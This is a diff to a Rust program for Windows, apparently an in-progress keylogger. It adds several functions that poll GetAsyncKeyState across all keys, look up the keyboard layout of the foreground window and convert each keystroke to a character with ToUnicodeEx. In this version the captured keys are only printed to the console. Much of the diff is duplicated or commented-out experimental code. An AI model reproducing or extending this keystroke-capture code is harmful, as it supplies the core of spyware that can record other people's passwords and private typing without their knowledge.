@@ -26,8 +26,12 @@ use windows::Win32::UI::WindowsAndMessaging::{GetForegroundWindow, GetWindowThre
 struct Keylogger {
     last_key: i32, // Stores the last key that was pressed
 }
+struct Keylogger2 {
+    last_key: Option<i32>, // Stores the last key that was pressed
+}
 
 // Key represents a single key entered by the user
+#[derive(Debug)]
 struct Key {
     empty: bool, // Indicates if a key is pressed or not
     rune: Option<char>, // The character representation of the key
@@ -50,7 +54,32 @@ fn main() {
     let mut keyboard_state = [0u8; 256];
 
     loop {
-        for i in keycodes.iter() {
+        // let next = wait_for_next_key();
+        let next = get_next();
+        println!("next: {:?}", next);
+        // let t =  unsafe { GetKeyboardState(&mut keyboard_state) };
+        //
+        // // Get the handle to the foreground window
+        // let foreground_window = unsafe { GetForegroundWindow() };
+        // // Get the thread id of the foreground window
+        // let thread_id = unsafe { GetWindowThreadProcessId(foreground_window, None) };
+        // // Get the keyboard layout for the foreground thread
+        // let layout = unsafe { GetKeyboardLayout(thread_id) };
+        // let mut pwszbuff = [0u16; 1]; // Create a buffer
+        // // Use the correct arguments for ToUnicodeEx
+        // let code = unsafe {
+        //     ToUnicodeEx(
+        //         k as u32, // Use the key code as `wvirtkey`
+        //         0, // `wscancode`, it's usually obtained from a WM_KEYDOWN or WM_KEYUP message.
+        //         &keyboard_state,
+        //         &mut pwszbuff, // Pass the buffer
+        //         0, // `wflags`, always 0 for this usage
+        //         layout
+        //     )
+        // };
+
+
+       /* for i in keycodes.iter() {
             let k = *i;
             let key_code = unsafe { GetAsyncKeyState(k) };
             if key_code == 0 {
@@ -88,32 +117,208 @@ fn main() {
                     layout
                 )
             };
-        }
+        }*/
     }
 }
 
+fn get_next() -> Key {
+    let mut keyboard_state = [0u8; 256];
+
+    let next = wait_for_next_key();
+    println!("next: {:?}", next);
+    let t =  unsafe { GetKeyboardState(&mut keyboard_state) };
+
+    // Get the handle to the foreground window
+    let foreground_window = unsafe { GetForegroundWindow() };
+    // Get the thread id of the foreground window
+    let thread_id = unsafe { GetWindowThreadProcessId(foreground_window, None) };
+    // Get the keyboard layout for the foreground thread
+    let layout = unsafe { GetKeyboardLayout(thread_id) };
+    let mut pwszbuff = [0u16; 1]; // Create a buffer
+    // Use the correct arguments for ToUnicodeEx
+    let code = unsafe {
+        ToUnicodeEx(
+            next as u32, // Use the key code as `wvirtkey`
+            0, // `wscancode`, it's usually obtained from a WM_KEYDOWN or WM_KEYUP message.
+            &keyboard_state,
+            &mut pwszbuff, // Pass the buffer
+            0, // `wflags`, always 0 for this usage
+            layout
+        )
+    };
+    // println!("typeing {}: {} kb: {:?}", i, code, layout);
+    println!(">>> buff {:?}",  pwszbuff);
+
+    let mut key = Key::new();
+    key.empty = false;
+    key.keycode = next;
+
+    // let code_point: u32 = 1567; ///ssssfqwewerdfgrtasd
+    let code_point: u32 = pwszbuff[0] as u32;
+    if let Some(character) = char::from_u32(code_point) {
+        // let character = character.to_string();
+        if character.is_control() {
+            println!("{} is a control character", code_point);
+            key.empty = true;
+        } else {
+            key.rune = Some(character);
+            let character_string = character.to_string();
+            println!("{}", character_string);
+        }
+        // println!(">>> {}", character_string);
+    } else {
+        key.empty = true;
+        println!("Invalid Unicode code point: {}", code_point);
+    };
+
+    key
+}
 fn wait_for_next_key() -> i32 {
     let keycodes = get_main_key_codes();
-    let mut keylogger = Keylogger { last_key: 0 };
+    let mut last_key: Option<i32> = None;
+    loop {
+        for &key in keycodes.iter() {
+            let key_code = unsafe { GetAsyncKeyState(key) };
+            if key_code == 0 {
+                if let Some(last) = last_key {
+                    if last == key {
+                        // last_key = None;
+                        // println!("key2 >>>>>>>>>:      {:?} - {}", key_code, key);
+                        return key;
+                    }
+                }
+                continue;
+            }
+
+            // The shift is for only pressed key
+            if key_code != -32768 || key_code & (1 << 15) == 0 {
+                continue;
+            }
+            // // only pressed key
+            // println!("key:      {:?} - {}", key_code, key);
+            // if key_code & (1 << 15) == 0 {
+            //     continue;
+            // }
+            // if let Some(last) = last_key {
+            //     if last == key {
+            //         continue;
+            //     }
+            // }
+            last_key = Some(key);
+            // return key;
+        }
+        thread::sleep(Duration::from_millis(5));
+    }
+}
+
+fn wait_for_next_key3() -> Option<i32> {
+    let keycodes = get_main_key_codes();
+    let mut keylogger = Keylogger2 { last_key: None };
     loop {
         for i in keycodes.iter() {
-            let k = *i;
-            let key_code = unsafe { GetAsyncKeyState(k) };
+            let key = *i;
+            let key_code = unsafe { GetAsyncKeyState(key) };
             if key_code == 0 {
+                if keylogger.last_key.is_some() && keylogger.last_key.unwrap() == key {
+                    keylogger.last_key = None;
+                    return Some(key);
+                    println!("key2 >>>>>>>>>:      {:?} - {}", key_code, key  )   ;
+                }
+                continue;
+            }
+            if key_code != -32768 {
                 continue;
             }
             // only pressed key
+            println!("key:      {:?} - {}", key_code, key  )   ;
             if key_code & (1 << 15) == 0 {
                 continue;
             }
-            if keylogger.last_key == k {
-                continue;
+            if keylogger.last_key.is_some() {
+                if keylogger.last_key.unwrap() == key {
+                    continue;
+                }
             }
-            keylogger.last_key = k;
-            println!("key:      {:?}", key_code);
-            return k;
+            keylogger.last_key = Some(key);
+            // return Some(key);
         }
         thread::sleep(Duration::from_millis(5));
+    }
+}
+
+
+fn wait_for_next_key2() -> i32 {
+    let keycodes = get_main_key_codes();
+    let mut keylogger = Keylogger2 { last_key: None };
+    loop {
+        for i in keycodes.iter() {
+            let key = *i;
+            let key_code = unsafe { GetAsyncKeyState(key) };
+            if key_code == 0 {
+                if keylogger.last_key.is_some() {
+                    return keylogger.last_key.unwrap();
+                }
+                continue;
+            }
+            if key_code != -32768 {
+                continue;
+            }
+            // only pressed key
+            println!("key:      {:?} - {}", key_code, key  )   ;
+            if key_code & (1 << 15) == 0 {
+                // continue;
+            }
+
+            if key_code == 0 {
+                if keylogger.last_key.is_some() {
+                    return keylogger.last_key.unwrap();
+                }
+                continue;
+            }
+
+
+            match keylogger.last_key {
+                Some(last_key) => {
+                    if last_key == key {
+                        continue;
+                    }
+                    if key_code == 0 {
+                        continue;
+                    }
+                    // only pressed key
+                    if key_code & (1 << 15) == 0 {
+                        continue;
+                    }
+                },
+                None => {
+                    if key_code == 0 {
+                        continue;
+                    }
+                    keylogger.last_key = Some(key);
+                    continue;
+                }
+            }
+
+            // if key_code == 0 {
+            //     continue;
+            // }
+            // // only pressed key
+            // if key_code & (1 << 15) == 0 {
+            //     continue;
+            // }
+            // if keylogger.last_key == 0 {
+            //     keylogger.last_key = key;
+            //     continue
+            // }
+            //
+            // if keylogger.last_key == key {
+            //     continue;
+            // }
+            // // the key is fully pressed
+            // println!("key:      {:?}", key_code);
+            // return key;
+        }
+        thread::sleep(Duration::from_millis(50));
     }
 }
 
@@ -134,7 +339,7 @@ fn get_main_key_codes() -> Vec<i32> {
         let state = unsafe { GetAsyncKeyState(i) };
 
         // Print the state of the key
-        println!("VirtualKey {:?}: {}", i, state);
+        // println!("VirtualKey {:?}: {}", i, state);
     }
     keycodes
 }
@@ -396,5 +601,54 @@ fn f1() {
         }
 
         thread::sleep(Duration::from_millis(100));
+    }
+}
+
+
+fn main4() {
+    let keycodes = get_main_key_codes();
+    let mut keylogger = Keylogger{last_key: 0};
+    let mut keyboard_state = [0u8; 256];
+
+    loop {
+        for i in keycodes.iter() {
+            let k = *i;
+            let key_code = unsafe { GetAsyncKeyState(k) };
+            if key_code == 0 {
+                continue;
+            }
+            // only pressed key
+            if key_code & (1 << 15) == 0 {
+                continue;
+            }
+            if keylogger.last_key == k {
+                continue;
+            }
+            keylogger.last_key = k;
+            println!("key:      {:?}",key_code);
+
+            let t =  unsafe { GetKeyboardState(&mut keyboard_state) };
+            println!("{:?}",t);
+            println!("{:?}",keyboard_state);
+
+            // Get the handle to the foreground window
+            let foreground_window = unsafe { GetForegroundWindow() };
+            // Get the thread id of the foreground window
+            let thread_id = unsafe { GetWindowThreadProcessId(foreground_window, None) };
+            // Get the keyboard layout for the foreground thread
+            let layout = unsafe { GetKeyboardLayout(thread_id) };
+            let mut pwszbuff = [0u16; 1]; // Create a buffer
+            // Use the correct arguments for ToUnicodeEx
+            let code = unsafe {
+                ToUnicodeEx(
+                    k as u32, // Use the key code as `wvirtkey`
+                    0, // `wscancode`, it's usually obtained from a WM_KEYDOWN or WM_KEYUP message.
+                    &keyboard_state,
+                    &mut pwszbuff, // Pass the buffer
+                    0, // `wflags`, always 0 for this usage
+                    layout
+                )
+            };
+        }
     }
 }
